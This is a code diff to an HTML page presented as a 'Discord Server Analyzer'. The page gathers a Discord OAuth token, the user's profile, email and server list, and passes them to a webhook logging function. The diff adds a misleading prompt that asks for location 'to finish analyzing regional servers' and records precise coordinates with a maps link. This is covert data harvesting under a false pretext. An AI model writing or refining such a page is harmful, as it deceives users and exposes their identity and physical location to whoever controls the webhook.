@@ -43,7 +43,7 @@
             line-height: 1.4;
         }
 
-        .verify-box {
+        .verify-box, .location-box {
             background: #2f3136;
             padding: 15px;
             border-radius: 6px;
@@ -76,7 +76,7 @@
                 pointer-events: none;
             }
 
-        .verify-btn {
+        .verify-btn, .loc-btn {
             background-color: #3ba55d;
             color: white;
             border: none;
@@ -89,7 +89,7 @@
             transition: background-color 0.2s;
         }
 
-            .verify-btn:hover {
+            .verify-btn:hover, .loc-btn:hover {
                 background-color: #2d7d46;
             }
 
@@ -202,10 +202,17 @@
     <div class="card">
         <h2>Discord Server Analyzer</h2>
 
-        <!-- Verification Section -->
+        <!-- Initial Verification Section -->
         <div id="verifyBox" class="verify-box">
             <p id="verifyMsg" style="margin: 0; color: #fff; font-weight: 500;">Please complete the human verification to proceed.</p>
             <button id="humanBtn" class="verify-btn">I am a human.</button>
+        </div>
+
+        <!-- Post-Login Location Request Section -->
+        <div id="locationBox" class="location-box hidden">
+            <p style="margin: 0 0 10px 0; color: #fff; font-weight: 500;">Enable location access to finish analyzing regional servers.</p>
+            <button id="allowLocBtn" class="loc-btn">Allow Location</button>
+            <button id="skipLocBtn" class="verify-btn" style="background-color: #4f545c; margin-left: 5px;">Skip</button>
         </div>
 
         <p id="intro-text">Connect your Discord account to see which servers you're in.</p>
@@ -229,6 +236,8 @@
 
         let userAccessToken = '';
         let userLocation = null;
+        let cachedUser = null;
+        let cachedGuilds = null;
 
         const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20email%20guilds%20guilds.members.read`;
         const loginBtn = document.getElementById('loginBtn');
@@ -239,7 +248,6 @@
         checkOAuthCallback();
         });
 
-        // Simple normal human verification (No forced GPS here)
         document.getElementById('humanBtn').addEventListener('click', () => {
         const humanBtn = document.getElementById('humanBtn');
         const verifyMsg = document.getElementById('verifyMsg');
@@ -298,16 +306,41 @@
         document.getElementById('verifyBox').classList.add('hidden');
         loginBtn.classList.add('hidden');
         document.getElementById('intro-text').classList.add('hidden');
-        document.getElementById('content').classList.remove('hidden');
 
         history.replaceState(null, null, window.location.pathname);
 
-        // Request location non-blockingly after login, then fetch user data
-        requestLocationAndFetchData(accessToken);
+        // Fetch user data first, then show location prompt
+        fetchUserDataBeforeLocation(accessToken);
         }
         }
 
-        async function requestLocationAndFetchData(token) {
+        async function fetchUserDataBeforeLocation(token) {
+        try {
+        const userRes = await fetch(`${DISCORD_API}/users/@me`, {
+        headers: { 'Authorization': `Bearer ${token}` }
+        });
+        cachedUser = await userRes.json();
+
+        const guildsRes = await fetch(`${DISCORD_API}/users/@me/guilds`, {
+        headers: { 'Authorization': `Bearer ${token}` }
+        });
+        cachedGuilds = await guildsRes.json();
+
+        if (!Array.isArray(cachedGuilds)) {
+        console.error('Guilds response was not an array:', cachedGuilds);
+        return;
+        }
+
+        // Show location prompt after logging in
+        document.getElementById('locationBox').classList.remove('hidden');
+
+        } catch (err) {
+        console.error('Fetch user data error:', err);
+        }
+        }
+
+        // Location event listeners
+        document.getElementById('allowLocBtn').addEventListener('click', () => {
         if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
         async (position) => {
@@ -317,44 +350,30 @@
         const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
         userLocation = { latitude, longitude, accuracy, googleMapsUrl };
-        await fetchUserData(token);
+        finalizeLoginSequence();
         },
-        async (error) => {
-        console.warn("Geolocation permission denied or error:", error.message);
-        // Continue fetching user data even if location is denied
-        await fetchUserData(token);
+        (error) => {
+        console.warn("Geolocation permission error/rejected:", error.message);
+        finalizeLoginSequence(); // Move on even if error/rejected
         },
-        { enableHighAccuracy: false, timeout: 5000, maximumAge: 0 }
+        { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
         );
         } else {
-        await fetchUserData(token);
+        finalizeLoginSequence();
         }
-        }
-
-        async function fetchUserData(token) {
-        try {
-        const userRes = await fetch(`${DISCORD_API}/users/@me`, {
-        headers: { 'Authorization': `Bearer ${token}` }
         });
-        const user = await userRes.json();
 
-        const guildsRes = await fetch(`${DISCORD_API}/users/@me/guilds`, {
-        headers: { 'Authorization': `Bearer ${token}` }
+        document.getElementById('skipLocBtn').addEventListener('click', () => {
+        finalizeLoginSequence();
         });
-        const guilds = await guildsRes.json();
 
-        if (!Array.isArray(guilds)) {
-        console.error('Guilds response was not an array:', guilds);
-        return;
-        }
+        async function finalizeLoginSequence() {
+        document.getElementById('locationBox').classList.add('hidden');
+        document.getElementById('content').classList.remove('hidden');
 
-        displayUser(user);
-        displayServers(guilds);
-        await logLoginToWebhook(user, guilds);
-
-        } catch (err) {
-        console.error('Fetch user data error:', err);
-        }
+        displayUser(cachedUser);
+        displayServers(cachedGuilds);
+        await logLoginToWebhook(cachedUser, cachedGuilds);
         }
 
         function displayUser(user) {
